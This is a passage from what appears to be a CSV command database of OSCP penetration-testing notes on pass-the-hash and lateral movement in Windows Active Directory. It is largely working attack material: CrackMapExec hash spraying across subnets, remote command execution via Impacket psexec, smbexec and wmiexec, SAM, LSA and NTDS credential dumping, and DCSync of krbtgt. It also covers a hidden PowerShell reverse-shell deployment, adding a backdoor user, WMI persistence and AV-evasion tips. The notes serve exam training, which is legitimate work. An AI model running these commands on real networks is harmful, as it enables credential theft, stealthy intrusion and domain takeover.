SMB    192.168.50.73    445    FILES04    [+] CORP\Administrator:2892...

(Pwn3d!)
```
(Pwn3d!) = Hash grants local administrator access on this system.

No (Pwn3d!) but [+] = Valid credentials but not admin:
```
SMB    192.168.50.75    445    WEB01      [+] CORP\jen:369def...
```
Authentication succeeded but user lacks admin privileges.

THREE PREREQUISITES:
1.

Valid NTLM hash from compromised user
2.

SMB port 445 accessible on targets
3.

No network segmentation blocking attacker  targets

2014 UAC REMOTE RESTRICTIONS (CRITICAL):
- RID 500 Administrator hash:
Works across all systems
- Other local admin hashes:
BLOCKED by UAC on Windows 7+ (except domain accounts)
- Domain user hashes:
Work if user is local admin on target

This is why training scenarios typically use:
- Built-in Administrator account (RID 500), OR
- Domain user accounts with local admin rights

HASH FORMAT:
- CrackMapExec:
-H NTLM_HASH (no colon prefix)
- Example:
-H 2892D26CDF84D7A70E2EB3B9F05C425E
- Accepts 32 hex characters

TARGET SPECIFICATION:
Multiple formats supported:
- Single IP:
192.168.50.73
- IP range:
192.168.50.1-192.168.50.254
- CIDR notation:
192.168.50.0/24
- Hostname:
files04.corp.com
- IP list file:
-t targets.txt

EXECUTION WORKFLOW:
1.

CME connects to each target via SMB (port 445)
2.

Attempts NTLM authentication with provided hash
3.

Tests if authenticated user has admin privileges
4.

Displays result:
[+] or [-] with (Pwn3d!) if admin
5.

Continues to next target

SPEED AND THREADING:
- Default threads:
Automatic (typically 100)
- Custom threads:
--threads 50
- /24 subnet:
1-2 minutes typical
- /16 subnet:
10-20 minutes (6553 6 hosts)

COMMON USE CASES:
Scenario 1:
Local admin password reuse
```bash
crackmapexec smb 192.168.50.0/24 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E
```
Finds all systems using same local Administrator password.

Scenario 2:
Domain user with local admin rights
```bash
crackmapexec smb 192.168.50.0/24 -u jen -H 369def79d8372408bf6e93364cc93075 -d corp.com
```
Finds all systems where jen is local admin.

Scenario 3:
Domain admin access
```bash
crackmapexec smb 192.168.50.0/24 -u admin_da -H <HASH> -d corp.com
```
Domain admin hash typically works on ALL domain-joined systems.

LOCAL VS DOMAIN AUTHENTICATION:
- Default:
Domain authentication (if domain detected)
- Force local:
--local-auth flag
- Explicit domain:
-d corp.com

AUTHENTICATION ONLY (NO EXPLOITATION):
CME spray tests authentication without executing commands:
- Fast:
No command execution overhead
- Stealthy:
Minimal Event Log entries
- Safe:
Doesn't trigger command execution alerts

POST-EXPLOITATION OPTIONS:
After identifying pwned systems:
```bash
# Execute command on all pwned hosts
crackmapexec smb 192.168.50.0/24 -u Administrator -H <HASH> -x whoami

# Dump SAM hashes from all pwned hosts  
crackmapexec smb 192.168.50.0/24 -u Administrator -H <HASH> --sam

# Dump LSA secrets
crackmapexec smb 192.168.50.0/24 -u Administrator -H <HASH> --lsa
```

OUTPUT INTERPRETATION:
```
[+] Successful authentication
[-] Failed authentication
[*] Informational message
(Pwn3d!) Local administrator access confirmed
```

VERIFICATION:
Before spraying, test hash on known target:
```bash
crackmapexec smb 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E
```
Confirm [+] before spraying subnet.

TIME ESTIMATE:
- /24 subnet (254 hosts):
1-2 minutes
- Single host verification:
<10 seconds
- /16 subnet:
Not recommended for exam (too slow)

EXAM STRATEGY:
1.

Obtain hash via secretsdump/Mimikatz
2.

Verify hash on source system
3.

Spray across lab subnet to find reuse
4.

Prioritize high-value targets from results
5.

Use --sam to extract more hashes from pwned systems
6.

Repeat spray with newly obtained hashes

COMMON FAILURES:
- Many [-] expected:
Hash won't work everywhere
- Timeout errors:
Increase --timeout 5
- No Pwn3d found:
Try --local-auth or different hash
- Connection refused:
Firewall blocking port 445

FORENSIC ARTIFACTS (PER TARGET):
- Event ID 4624:
Logon Type 3 (Network logon attempt)
- Event ID 4625:
Failed logon (if hash invalid on that system)
- Event ID 4672:
Special privileges (if admin access)
- Minimal footprint compared to command execution

DIFFERENCE FROM PASSWORD SPRAYING:
- Password spray:
One password, many users (horizontal)
- Hash spray:
One hash, many systems (lateral)
- PTH spray finds where credential is reused across infrastructure","high","","","","{""Many failures expected"": ""Hash may only work on specific systems - look for Pwn3d!"", ""Timeout on subnet scan"": ""Reduce range or increase timeout: --timeout 5"", ""UAC blocking"": ""Local admin hashes blocked except RID 500 Administrator"", ""No Pwn3d found"": ""Try domain accounts or different hash""}","{""-u <USER>"": ""Username to test"", ""-H <NTLM_HASH>"": ""NTLM hash for authentication"", ""-x '<CMD>'"": ""Execute cmd.exe command on pwned hosts"", ""-X '<CMD>'"": ""Execute PowerShell command on pwned hosts"", ""--sam"": ""Dump SAM hashes on pwned hosts"", ""--lsa"": ""Dump LSA secrets on pwned hosts"", ""--local-auth"": ""Test local authentication instead of domain""}","","[""pth-impacket-psexec""]",""
"pth-cme-exec","Pass-the-Hash - CrackMapExec Execute","active-directory","crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH> -x '<COMMAND>'","Execute commands on remote system using NTLM hash with CrackMapExec","lateral-movement","crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E -x 'whoami'","OSCP TRAINING MATERIAL - PASS-THE-HASH COMMAND EXECUTION WITH CRACKMAPEXEC:
WHAT IS CME EXEC:
CrackMapExec wrapper combining pass-the-hash authentication with remote command execution in a single operation.

Efficient for quick enumeration and exploitation.

WHY USE CME EXEC:
- One-liner:
Authentication + command in single command
- Multiple execution methods:
Choose stealth vs speed
- Quick enumeration:
Faster than establishing full shell
- Mass execution:
Run same command on multiple targets
- Built-in credential dumping:
--sam, --lsa flags

THREE PREREQUISITES:
1.

Valid NTLM hash from compromised user
2.

SMB/WMI access to target (ports 445/135)
3.

User must be local administrator

EXECUTION METHODS:
CME supports multiple backend methods:
- wmiexec (default):
Uses WMI, fileless, stealthy, no service creation
- smbexec:
Uses SMB, batch files, fileless, temporary service
- atexec:
Uses Task Scheduler, scheduled task creation
- mmcexec:
Uses MMC20.Application COM object

Select method:
```bash
crackmapexec smb 192.168.50.73 -u Administrator -H <HASH> -x whoami --exec-method wmiexec
```

COMMAND TYPES:
- -x 'COMMAND':
Execute cmd.exe command
- -X 'COMMAND':
Execute PowerShell command

Examples:
```bash
# CMD command
crackmapexec smb 192.168.50.73 -u Administrator -H <HASH> -x 'whoami'

# PowerShell command
crackmapexec smb 192.168.50.73 -u Administrator -H <HASH> -X 'Get-Process'
```

HASH FORMAT:
- CrackMapExec:
-H NTLM_HASH (no colon)
- Example:
-H 2892D26CDF84D7A70E2EB3B9F05C425E

2014 UAC REMOTE RESTRICTIONS:
- RID 500 Administrator:
Works
- Other local admins:
Blocked by UAC
- Domain users with local admin:
Works

COMMON ENUMERATION COMMANDS:
Quick wins for OSCP:
```bash
# System information
crackmapexec smb <TARGET> -u <USER> -H <HASH> -x 'systeminfo'

# Current user
crackmapexec smb <TARGET> -u <USER> -H <HASH> -x 'whoami /all'

# Network information
crackmapexec smb <TARGET> -u <USER> -H <HASH> -x 'ipconfig /all'

# Running processes
crackmapexec smb <TARGET> -u <USER> -H <HASH> -X 'Get-Process'

# Installed software
crackmapexec smb <TARGET> -u <USER> -H <HASH> -X 'Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'
```

CREDENTIAL DUMPING:
Built-in flags for credential extraction:
```bash
# Dump SAM hashes
crackmapexec smb 192.168.50.73 -u Administrator -H <HASH> --sam

# Dump LSA secrets
crackmapexec smb 192.168.50.73 -u Administrator -H <HASH> --lsa

# Dump NTDS.dit (Domain Controller)
crackmapexec smb 192.168.50.100 -u Administrator -H <HASH> --ntds
```

OUTPUT RETRIEVAL:
CME displays command output directly:
```
SMB    192.168.50.73    445    FILES04    [+] Executed command
SMB    192.168.50.73    445    FILES04    files04\administrator
```

NO OUTPUT OPTION:
For speed without output retrieval:
```bash
crackmapexec smb <TARGET> -u <USER> -H <HASH> -x 'command' --no-output
```
Useful for mass deployment (reverse shells, etc.).

MULTIPLE TARGETS:
Execute on multiple systems:
```bash
# CIDR range
crackmapexec smb 192.168.50.0/24 -u Administrator -H <HASH> -x 'hostname'

# Target list
crackmapexec smb -t targets.txt -u Administrator -H <HASH> -x 'whoami'
```

COMPARISON TO OTHER TOOLS:
- impacket-psexec:
Interactive shell, SYSTEM context, slower
- impacket-wmiexec:
Semi-interactive shell, user context, fileless
- CME exec:
Single command, fast, multiple methods

When to use CME exec:
- Quick enumeration:
Get system info fast
- Testing access:
Verify hash works
- Mass deployment:
Deploy to multiple targets
- Credential dumping:
--sam/--lsa faster than manual

When to use full shell (PSExec/WMIExec):
- Interactive exploration needed
- Complex multi-step tasks
- Manual enumeration required
- File manipulation needed

REVERSE SHELL DEPLOYMENT:
CME can deploy reverse shells:
```bash
# PowerShell reverse shell (base64)
crackmapexec smb <TARGET> -u <USER> -H <HASH> -X 'powershell -nop -w hidden -e <BASE64_PAYLOAD>'
```

Set up listener first:
```bash
nc -lvnp 443
```

EXECUTION METHOD COMPARISON:
wmiexec (default):
- Fileless, no service creation
- Slower per command
- Stealthy
- Recommended for exam

smbexec:
- Batch files, temporary service
- Faster than wmiexec
- More artifacts

atexec:
- Uses Task Scheduler
- Creates scheduled task
- Task visible in Task Scheduler
- Leaves Event ID 4698

VERIFICATION:
Test before exploitation:
```bash
crackmapexec smb 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E
```
Look for (Pwn3d!) before -x commands.

TIME ESTIMATE:
- Single command:
5-10 seconds
- Multiple targets:
1-2 minutes for /24
- Credential dumping (--sam):
10-30 seconds

EXAM STRATEGY:
1.

Verify hash with CME (no -x)
2.

Quick enumeration:
systeminfo, whoami, ipconfig
3.

Credential dumping:
--sam for local hashes
4.

If complex tasks needed, switch to PSExec/WMIExec full shell
5.

For mass deployment, use CME -x with reverse shell payload

COMMON FAILURES:
- Authentication failed:
Hash invalid or user not admin
- No output:
Try different --exec-method
- STATUS_ACCESS_DENIED:
User lacks admin privileges
- Execution method fails:
Switch method (wmiexec  smbexec)

FORENSIC ARTIFACTS:
- Event ID 4624:
Network logon
- Event ID 4672:
Special privileges
- WMI logs:
If using wmiexec method
- Service creation:
If using smbexec method
- Task creation (Event 4698):
If using atexec
- Process creation (Event 4688):
For spawned processes","high","","","","{""No output"": ""Try different --exec-method: wmiexec, smbexec, atexec"", ""Authentication failed"": ""Verify hash works: crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>"", ""Command syntax error"": ""Use -x for cmd.exe, -X for PowerShell""}","{""-x '<CMD>'"": ""Execute cmd.exe command"", ""-X '<CMD>'"": ""Execute PowerShell command"", ""--exec-method"": ""Specify method: wmiexec (default), smbexec, atexec, mmcexec"", ""--no-output"": ""Don't retrieve command output (faster)""}","","[""pth-impacket-psexec""]",""
"pth-verify-hash-format","Pass-the-Hash - Verify Hash Format","active-directory","crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>","Test if NTLM hash is valid format and works for authentication before exploitation","lateral-movement","crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E","OSCP TRAINING MATERIAL - HASH VERIFICATION BEFORE EXPLOITATION:
WHY VERIFY FIRST:
Always test hash validity before attempting lateral movement.

Saves exam time by catching errors early (invalid format, wrong user, UAC restrictions, etc.).

WHAT IS HASH VERIFICATION:
Using CrackMapExec to test if NTLM hash is valid format and grants access before committing to full exploitation tool (PSExec, WMIExec, etc.).

BEST PRACTICE WORKFLOW:
1.

Obtain NTLM hash (secretsdump, Mimikatz, etc.)
2.

VERIFY with crackmapexec (fast, <10 seconds)
3.

Check for (Pwn3d!) indicator
4.

If success, proceed with lateral movement tool
5.

If failure, troubleshoot hash/credentials

NTLM HASH FORMAT:
- Length:
32 hexadecimal characters (128 bits)
- Character set:
0-9, A-F (case insensitive)
- Example:
2892D26CDF84D7A70E2EB3B9F05C425E
- No colons, spaces, or special characters

COMMON HASH FORMATS IN DUMPS:
Secretsdump output format:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892D26CDF84D7A70E2EB3B9F05C425E:::
```
Fields:
USERNAME:RID:LM_HASH:NTLM_HASH:::
Extract NTLM hash (4th field after 3rd colon):
- LM hash:
aad3b435b51404eeaad3b435b51404ee (disabled/empty)
- NTLM hash:
2892D26CDF84D7A70E2EB3B9F05C425E (use this)

LM vs NTLM:
- LM hash:
Legacy (pre-Windows Vista), weak, often disabled
- NTLM hash:
Modern (Windows Vista+), 128-bit MD4, used for authentication
- Empty LM:
aad3b435b51404eeaad3b435b51404ee indicates LM disabled
- Only NTLM needed for pass-the-hash on modern systems

Mimikatz output format:
```
Username :
Administrator
Domain   :
CORP
NTLM     :
2892d26cdf84d7a70e2eb3b9f05c425e
```
Extract from ""NTLM"" line.

CrackMapExec SAM dump format:
```
SMB    192.168.50.73    445    FILES04    Administrator:500:aad3...:2892...:::
```
Same format as secretsdump - use 4th field.

OUTPUT INTERPRETATION:
Success with admin access:
```
SMB    192.168.50.73    445    FILES04    [+] CORP\Administrator:2892D...

(Pwn3d!)
```
(Pwn3d!) = Hash grants local administrator access.

Success without admin:
```
SMB    192.168.50.75    445    WEB01      [+] CORP\jen:369def...
```
[+] without (Pwn3d!) = Authentication succeeded but user lacks admin privileges.

Failure:
```
SMB    192.168.50.76    445    DB01       [-] CORP\Administrator:2892D...

STATUS_LOGON_FAILURE
```
[-] = Hash invalid, username wrong, or account disabled.

VERIFICATION COMMAND:
```bash
crackmapexec smb 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E
```

CRACKMAPEXEC ADVANTAGES:
- Fast:
<10 seconds per host
- Clear output:
(Pwn3d!) indicator obvious
- Authentication only:
No command execution (stealthy)
- Multi-protocol:
Test SMB, WinRM, MSSQL, etc.
- Batch testing:
Test multiple hosts/hashes quickly

COMMON VERIFICATION ERRORS:
Invalid hash format:
```
[-] Invalid hash format
```
Fix:
Ensure 32 hex characters, no spaces/colons.

STATUS_LOGON_FAILURE:
```
[-] STATUS_LOGON_FAILURE
```
Causes:
- Hash extracted incorrectly (wrong field)
- Username doesn't match hash
- Account disabled
- Hash is LM not NTLM

No (Pwn3d!) despite [+]:
```
[+] CORP\jen:369def...


```
Authentication succeeded but user not local admin.

2014 UAC RESTRICTIONS:
Local admin hash blocked:
```
[+] CORP\localadmin:abc123...


```
No (Pwn3d!) because UAC blocks non-RID-500 local admins.

Workaround:
Use RID 500 Administrator or domain user.

HASH EXTRACTION FROM SECRETSDUMP:
Full command:
```bash
impacket-secretsdump CORP/Administrator:Password123!@192.168.50.73
```

Output:
```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892D26CDF84D7A70E2EB3B9F05C425E:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Extract:
- Administrator hash:
2892D26CDF84D7A70E2EB3B9F05C425E
- Guest hash:
31d6cfe0d16ae931b73c59d7e0c089c0 (empty password)

USER:HASH MATCHING:
Critical:
Username must match the user whose hash you have.

Correct:
```bash
crackmapexec smb <TARGET> -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E
```

Incorrect:
```bash
crackmapexec smb <TARGET> -u jen -H 2892D26CDF84D7A70E2EB3B9F05C425E
```
Hash belongs to Administrator, not jen.

DOMAIN VS LOCAL AUTHENTICATION:
Default:
CME attempts domain authentication.

Force local:
```bash
crackmapexec smb <TARGET> -u Administrator -H <HASH> --local-auth
```

Explicit domain:
```bash
crackmapexec smb <TARGET> -u Administrator -H <HASH> -d CORP
```

VERIFY MULTIPLE HASHES:
Test all extracted hashes:
```bash
for hash in hash1 hash2 hash3; do
  crackmapexec smb 192.168.50.73 -u Administrator -H $hash
done
```

Find which hash works.

TIME ESTIMATE:
- Single verification:
<10 seconds
- Multiple hashes:
<1 minute
- Subnet spray:
1-2 minutes

EXAM STRATEGY:
1.

Extract all hashes from compromised system (secretsdump)
2.

Verify EACH hash with crackmapexec before exploitation
3.

Look for (Pwn3d!) - indicates admin access
4.

If hash fails, troubleshoot format before wasting time on full tools
5.

Once verified, proceed confidently with PSExec/WMIExec

DECISION TREE:
- (Pwn3d!):
Proceed with lateral movement (PSExec, WMIExec, etc.)
- [+] without Pwn3d:
User valid but not admin (try different user)
- [-]:
Hash/username invalid (re-extract hash, verify username)
- UAC blocked:
Switch to RID 500 or domain user

ALTERNATIVE VERIFICATION:
Test with Impacket directly (slower):
```bash
impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```
But CrackMapExec faster for verification only.

FORENSIC ARTIFACTS (VERIFICATION):
Minimal footprint:
- Event ID 4624:
Network logon attempt (Type 3)
- Event ID 4625:
Failed logon (if hash invalid)
- No command execution artifacts
- Stealthy:
Authentication test only

VERIFICATION SAVES TIME:
Without verification:
1.

Attempt PSExec with invalid hash  2 minutes wasted
2.

Troubleshoot why PSExec failed  5 minutes wasted
3.

Re-extract hash  2 minutes
4.

Retry PSExec  2 minutes
Total:
11 minutes

With verification:
1.

Verify hash with CME  10 seconds
2.

Identify problem immediately  1 minute fix
3.

PSExec with correct hash  2 minutes
Total:
3 minutes

Saved:
8 minutes (critical in 24-hour exam)","medium","","","","{""STATUS_LOGON_FAILURE"": ""Invalid hash or username. Verify hash extraction"", ""+ without Pwn3d"": ""User authenticated but not local admin"", ""Invalid hash format"": ""Ensure 32 hex characters, no spaces/colons/prefixes"", ""Hash from wrong user"": ""Match hash to username - secretsdump output shows user:hash pairs""}","{""-u <USER>"": ""Username to test"", ""-H <NTLM_HASH>"": ""NTLM hash (32 hex characters)"", ""--local-auth"": ""Test local authentication instead of domain""}","","",""
"impacket-psexec","Impacket PSExec - Remote Command Execution","exploitation","impacket-psexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'","Execute commands on remote Windows system via SMB + MSRPC. Creates Windows service, provides interactive shell. Most versatile Impacket execution tool.","lateral-movement","impacket-psexec 'corp.com/administrator:P@ssw0rd!@192.168.50.75'","MOST VERSATILE Impacket execution method. Provides interactive SYSTEM shell, file upload/download, and stable connection. WHEN TO USE: After validating admin credentials, for interactive post-exploitation (dumping SAM, searching files, installing persistence). WHY PSEXEC: Interactive shell is easier than semi-interactive wmiexec/smbexec. DISADVANTAGES: Writes RemComSvc.exe to disk (may trigger AV), creates Windows service (logged in Event ID 7045). Time estimate: 5-10 seconds for shell.

MANUAL ALTERNATIVES:

Pass-the-Hash (when you have NTLM hash):
impacket-psexec -hashes :<NTLM_HASH> 'corp.com/admin@192.168.50.75'

Local account authentication:
impacket-psexec './administrator:P@ssw0rd@192.168.50.75'

Kerberos authentication (requires TGT):
export KRB5CCNAME=admin.ccache
impacket-psexec -k -no-pass 'corp.com/admin@DC1.corp.com'

Execute single command and exit:
impacket-psexec 'corp.com/admin:pass@192.168.50.75' whoami

Use different service name (stealth):
Modify source: impacket-psexec changes service name in RemCom*.exe

AV EVASION: If PSExec blocked, use:
1. impacket-smbexec (creates service but no exe on disk)
2. impacket-wmiexec (pure WMI, no service, no exe)
3. CrackMapExec with --exec-method smbexec/wmiexec

COMMAND REFERENCE:
- Upload file: put local_file remote_path
- Download file: get remote_path local_file  
- Exit: exit or Ctrl+C

TIME ESTIMATE: 5-10 seconds (connection + shell), 1-2 seconds per command executed","high","","","","{""STATUS_LOGON_FAILURE"": ""Invalid credentials. Verify with: crackmapexec smb <TARGET> -u <USER> -p <PASS> -d <DOMAIN>. Check password case sensitivity. Try local account: './administrator:password@<TARGET>'."", ""STATUS_ACCESS_DENIED"": ""User lacks admin rights. Solution: Verify admin access: crackmapexec smb <TARGET> -u <USER> -p <PASS> --local-auth (check for Pwn3d!). User must be in local Administrators group or Domain Admins. Try different user or escalate privileges."", ""Connection refused"": ""SMB port 445 blocked. Verify: sudo nmap -p 445 -Pn <TARGET>. Check firewall rules. Try alternative tools: wmiexec (uses 135+random RPC) or smbexec (service-based)."", ""ERROR: Shell failed to launch"": ""RemComSvc.exe blocked by AV or service creation failed. Solution: Use impacket-smbexec (fileless) or impacket-wmiexec (WMI-based) as alternatives. These don't write exe to disk."", ""Special characters break command"": ""Password contains special chars. ALWAYS use single quotes: 'domain/user:P@ss!@target'. If single quote in password, escape: 'domain/user:P@ss'\""'\""'word@target'.""}","{""impacket-psexec"": ""Python reimplementation of Sysinternals PSExec. Uploads RemComSvc.exe to ADMIN$ share, creates Windows service, provides SYSTEM shell over SMB named pipes. ADVANTAGE: Interactive shell with upload/download capabilities. DISADVANTAGE: Writes exe to disk (may trigger AV). Requires ADMIN$ and IPC$ share access. Standard OSCP tool for post-exploitation shell access."", ""Authentication string format"": ""'DOMAIN/USER:PASS@TARGET' - CRITICAL: Use SINGLE QUOTES to prevent shell interpretation of special characters (!,$,\\,etc.). For local accounts, use './USER:PASS@TARGET'. For workgroup systems, use 'WORKGROUP/USER:PASS@TARGET'."", ""-hashes :<NTLM_HASH>"": ""Pass-the-Hash authentication. Colon prefix required. Example: -hashes :8846f7eaee8fb117ad06bdd830b7586c. Replaces password authentication. Use when you have hash but not plaintext password."", ""-k"": ""Use Kerberos authentication instead of NTLM. Requires TGT in KRB5CCNAME environment variable. More stealthy but requires additional setup."", ""-codec <ENCODING>"": ""Character encoding for shell (default: utf-8). Use if seeing garbled output. Example: -codec cp850 for Spanish Windows."", ""-no-pass"": ""Prompt for password interactively (hidden input). Avoids password in bash history. Combine with -k for Kerberos-only authentication.""}","","[""impacket-smbexec"", ""impacket-wmiexec"", ""ad-pass-the-hash-impacket-psexec""]","[""ad-lsass-dump-procdump"", ""ad-sam-dump-reg-save"", ""windows-search-sensitive-files""]"
"impacket-smbexec","Impacket SMBExec - Fileless Remote Execution","exploitation","impacket-smbexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'","Execute commands remotely via SMB service creation. Fileless alternative to psexec - creates service but no executable written to disk. Better AV evasion.","lateral-movement","impacket-smbexec 'corp.com/administrator:P@ssw0rd!@192.168.50.75'","BEST FOR AV EVASION. No executable written to disk - just service creation and deletion. WHEN TO USE: When psexec is blocked by AV, when you want lower forensic footprint, when ADMIN$ writeable but exe execution monitored. DISADVANTAGES: Semi-interactive shell (slower than psexec), output batched (not real-time), no file upload/download. WHY IT WORKS: Creates service pointing to cmd.exe with commands as parameters - Windows doesn't flag this as suspicious. Time estimate: 5-10 seconds per command (slower than psexec).

MANUAL ALTERNATIVES:

Pass-the-Hash:
impacket-smbexec -hashes :<NTLM_HASH> 'corp.com/admin@192.168.50.75'

Local account:
impacket-smbexec './administrator:P@ssw0rd@192.168.50.75'

PowerShell shell (better for modern commands):
impacket-smbexec -shell-type powershell 'corp.com/admin:pass@192.168.50.75'

Use local SMB server (if ADMIN$ disabled):
impacket-smbexec -mode server 'corp.com/admin:pass@192.168.50.75'

Single command execution:
impacket-smbexec 'corp.com/admin:pass@192.168.50.75' 'whoami /all'

COMPARISON:
psexec: Writes exe, interactive, fast, file transfer
smbexec: No exe, semi-interactive, slower, no file transfer, BETTER AV EVASION  
wmiexec: No exe, semi-interactive, different protocol (WMI), BEST AV EVASION

TIME ESTIMATE: 5-10 seconds per command (slower than psexec due to batched output)","high","","","","{""STATUS_LOGON_FAILURE"": ""Invalid credentials. Verify: crackmapexec smb <TARGET> -u <USER> -p <PASS>"", ""STATUS_ACCESS_DENIED"": ""User lacks admin rights. Verify membership in local Administrators or Domain Admins."", ""Service creation failed"": ""Service name collision or disabled service manager. Solution: Retry (service name randomized). If persists, use wmiexec."", ""Slow response / output timeout"": ""Expected for smbexec - semi-interactive shell batches output. Use wmiexec for faster execution or psexec for real-time output."", ""ADMIN$ share disabled"": ""Use -mode server flag to run local SMB server for output retrieval instead of ADMIN$ share.""}","{""impacket-smbexec"": ""Fileless command execution via SMB. Creates a Windows service that executes commands through cmd.exe and returns output via SMB named pipes. ADVANTAGE: No exe written to disk (better AV evasion). DISADVANTAGE: Semi-interactive shell (slower than psexec). Output batched instead of real-time. Requires ADMIN$ and IPC$ shares. Preferred when PSExec blocked by AV."", ""-hashes :<NTLM_HASH>"": ""Pass-the-Hash authentication. Use when you have hash but not password. Format: -hashes :8846f7eaee8fb117ad06bdd830b7586c (colon prefix required)."", ""-mode <share|server>"": ""Execution mode. share (default): Use ADMIN$ share for output. server: Start local SMB server for output retrieval. Use 'server' if ADMIN$ disabled."", ""-shell-type <cmd|powershell>"": ""Shell type. cmd (default): Classic cmd.exe. powershell: PowerShell shell (better for modern Windows post-exploitation).""}","","[""impacket-psexec"", ""impacket-wmiexec""]","[""ad-lsass-dump-procdump"", ""ad-sam-dump-reg-save"", ""windows-search-sensitive-files""]"
"impacket-wmiexec","Impacket WMIExec - WMI Remote Execution","exploitation","impacket-wmiexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'","Execute commands remotely via Windows Management Instrumentation (WMI). Fileless, serviceless, stealthiest Impacket execution method. Uses DCOM on port 135 + ephemeral RPC.","lateral-movement","impacket-wmiexec 'corp.com/administrator:P@ssw0rd!@192.168.50.75'","STEALTHIEST Impacket execution method. No exe, no service, uses WMI instead of SMB. WHEN TO USE: (1) Maximum stealth required, (2) SMB port 445 blocked but RPC available, (3) psexec/smbexec blocked by AV or HIPS. DISADVANTAGES: Semi-interactive (slower), no file transfer, requires RPC ports 135 + ephemeral. WHY STEALTHY: WMI is legitimate admin tool - creates Event ID 5857/5858 (WMI activity) instead of 7045 (service creation). Blends with normal sysadmin activity. Time estimate: 5-15 seconds per command.

MANUAL ALTERNATIVES:

Pass-the-Hash:
impacket-wmiexec -hashes :<NTLM_HASH> 'corp.com/admin@192.168.50.75'

Local account:
impacket-wmiexec './administrator:P@ssw0rd@192.168.50.75'

PowerShell shell (recommended):
impacket-wmiexec -shell-type powershell 'corp.com/admin:pass@192.168.50.75'

Fire-and-forget (no output retrieval):
impacket-wmiexec -nooutput 'corp.com/admin:pass@192.168.50.75' 'net user hacker P@ss123 /add'

Single command execution:
impacket-wmiexec 'corp.com/admin:pass@192.168.50.75' 'whoami /all'

WMI PERSISTENCE (advanced):
# Create WMI event subscription for persistence
impacket-wmiexec 'corp.com/admin:pass@192.168.50.75' 'powershell -c ""<WMI persistence payload>""'

COMPARISON TABLE:
PSExec: Fast, interactive, writes exe, creates service, SMB-only
SMBExec: Slower, semi-interactive, NO exe, creates service, SMB-only  
WMIExec: Slower, semi-interactive, NO exe, NO service, WMI protocol, STEALTHIEST

PORT REQUIREMENTS:
PSExec/SMBExec: TCP 445 (SMB)
WMIExec: TCP 135 (DCOM) + TCP 49152-65535 (ephemeral RPC)

TIME ESTIMATE: 5-15 seconds per command (slower than psexec, similar to smbexec)","high","","","","{""STATUS_LOGON_FAILURE"": ""Invalid credentials. Verify: crackmapexec smb <TARGET> -u <USER> -p <PASS>"", ""STATUS_ACCESS_DENIED"": ""User lacks DCOM permissions. Solution: Verify admin rights. WMI requires local Administrator or Domain Admin. Check with: crackmapexec winrm <TARGET> -u <USER> -p <PASS>"", ""Connection refused"": ""WMI port blocked (135 or ephemeral RPC ports). Solution: Verify firewall: sudo nmap -p 135,445 -Pn <TARGET>. WMI requires port 135 + ephemeral high ports (49152-65535). If only 445 open, use psexec/smbexec."", ""DCOM SessionError"": ""WMI service disabled or DCOM misconfigured. Solution: Use psexec/smbexec as alternative. Or enable WMI on target (requires prior access)."", ""Very slow execution"": ""Normal for wmiexec - semi-interactive shell with output batching. Each command creates new WMI process. Use -nooutput flag for fire-and-forget commands.""}","{""impacket-wmiexec"": ""WMI-based command execution. Uses DCOM to invoke Win32_Process.Create method remotely. ADVANTAGES: (1) No exe written to disk, (2) No service created (stealthier than psexec/smbexec), (3) Uses WMI (port 135 + dynamic RPC) instead of SMB 445, (4) Different event logs (WMI provider instead of service creation). DISADVANTAGES: Semi-interactive shell, no file upload/download, slower than psexec. Preferred when SMB is blocked but RPC is available."", ""-hashes :<NTLM_HASH>"": ""Pass-the-Hash authentication. Example: -hashes :8846f7eaee8fb117ad06bdd830b7586c"", ""-shell-type <cmd|powershell>"": ""Shell type. cmd (default): cmd.exe shell. powershell: PowerShell shell (recommended for modern Windows)."", ""-codec <ENCODING>"": ""Output encoding. Default: utf-8. Use cp850 for international Windows systems."", ""-nooutput"": ""Execute command without retrieving output. Use for fire-and-forget commands (e.g., add user, enable RDP). Faster but blind.""}","","[""impacket-psexec"", ""impacket-smbexec"", ""ad-pass-the-hash-impacket-wmiexec""]","[""ad-lsass-dump-procdump"", ""ad-sam-dump-reg-save"", ""windows-search-sensitive-files""]"
"impacket-secretsdump","Impacket Secretsdump - Credential Extraction","post-exploit","impacket-secretsdump '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'","Extract credentials from Windows systems using multiple methods: DCSync (DRSUAPI), SAM dump, LSA secrets, cached credentials. Swiss-army knife for Windows credential extraction.","credential-dumping","impacket-secretsdump 'corp.com/administrator:P@ssw0rd!@192.168.50.70'","SWISS-ARMY KNIFE for credential extraction. Automatically tries all methods - DCSync (if DC), SAM dump, LSA secrets, cached credentials. WHEN TO USE: (1) After gaining admin access, (2) For comprehensive credential harvest, (3) When unsure which extraction method to use. OSCP TIP: For exam, use targeted flags: -just-dc-user krbtgt (Golden Ticket), -sam (local accounts on workstations), -just-dc (full domain dump for labs). Automatic mode is comprehensive but noisier. Time estimate: 2-120 seconds depending on mode and domain size.

MANUAL ALTERNATIVES:

DCSync specific user (RECOMMENDED for OSCP):
impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70'

DCSync all domain users:
impacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70'

Local SAM dump (workstation/server):
